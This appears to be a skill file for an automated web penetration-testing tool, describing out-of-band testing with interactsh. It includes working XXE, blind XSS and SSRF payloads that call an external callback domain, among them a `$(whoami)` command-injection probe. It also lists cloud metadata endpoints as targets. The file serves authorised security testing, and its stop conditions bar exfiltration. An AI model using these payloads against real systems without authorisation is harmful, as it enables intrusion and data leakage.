---
name: oob-interaction-testing
version: "1.0.0"
description: "Out-of-band (OOB) interaction testing — blind SSRF, XXE, blind XSS, and callback proof via interactsh"
risk_level: "L0-L2"
approval: "L0 auto, L1 auto, L2 requires explicit approval"
program_types: [web2, api]
source: "reviewed from HackerAI tool recipes, PortSwigger research, ProjectDiscovery interactsh docs"
actions:
  - web.oob.interactsh
---

# Out-of-Band (OOB) Interaction Testing

**status:** active
**risk:** L0–L2
**approval:** L0 auto, L1 auto, L2 requires explicit approval
**program_types:** [web2, api]
**source:** reviewed from HackerAI tool recipes, PortSwigger research, ProjectDiscovery interactsh docs

OOB testing proves a vulnerability when the application gives no in-band
confirmation (no error, no reflected output). You plant a unique callback domain
in a payload; if the target makes a network request to that domain, the
vulnerability is confirmed — *reproducibly*, without touching anything else.

## Why OOB matters

Blind bugs are invisible in-band but are real, reportable vulnerabilities:

- **Blind SSRF** — the server fetches a URL but never returns the response body
- **Blind XXE** — an XML parser resolves an external entity silently
- **Blind XSS** — injected script runs in an admin panel you can't see
- **Command injection** — a command runs but output is swallowed
- **Webhook/outbound callback** — SSRF to internal services that call back out

The single most important rule: **start the listener before sending the payload,
and capture the interaction as evidence.** A callback you didn't record is not a
finding.

## Workflow (operator-controlled)

1. **Start the listener.** Run `web.oob.interactsh` (`interactsh-client -json`).
   It prints a unique domain like `c12345678.oast.fun` and streams interactions.
2. **Inject the domain** into the suspected sink, uniquely per test:
   - SSRF: `http://c12345678.oast.fun/ssrf-probe`
   - XXE: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://c12345678.oast.fun/xxe-probe">]>`
   - Blind XSS: `<script src="//c12345678.oast.fun/xss-probe"></script>`
3. **Wait** for a callback to appear in the listener output.
4. **Record the evidence** (interaction type, timestamp, source IP) before moving on.
5. **Stop** after the callback is confirmed — do not chain into data exfiltration.

## Blind SSRF

### Payloads
- HTTP: `http://<interactsh>/`, `http://<interactsh>/<unique-tag>`
- DNS: `http://$(whoami).<interactsh>/` in a command-context SSRF
- Non-HTTP schemes to fingerprint services: `gopher://`, `dict://`, `file://`
- Protocol smuggling: `http://127.0.0.1:8080/` with a redirect to the callback

### Internal metadata targets (only after OOB is proven, and only for proof)
- AWS `169.254.169.254/latest/meta-data/`, GCP `metadata.google.internal`,
  Azure `169.254.169.254/metadata/` — use `web.inject.ssrf-*` actions for these
  after OOB confirms SSRF exists.

## Blind XXE

- External DTD / entity resolving to `http://<interactsh>/xxe`
- Parameter entities (blind, no output): `%`-prefixed entities resolve silently
- File-read proof via OOB: entity that reads a file and sends it as a subdomain
  — **only** for a clearly-harmless file (`/etc/hostname`), never secrets.

## Blind XSS

- `<script src=//<interactsh>/x></script>`, `<img src=//<interactsh>/x>`
- If the app requires a tag, use `<img>` or a CSS `url()` to avoid JS filters
- A callback proves the payload rendered — screenshot it if the toolchain supports it.

## Stop conditions

- SSRF/XXE/XSS: confirm **one** callback to a unique tag, record it, stop.
- Never exfiltrate PII, secrets, credentials, or source via OOB channels.
- Never use OOB as a persistence or C2 channel.
- If the target rate-limits or blocks the callback, stop — do not rotate listeners
  to evade controls.
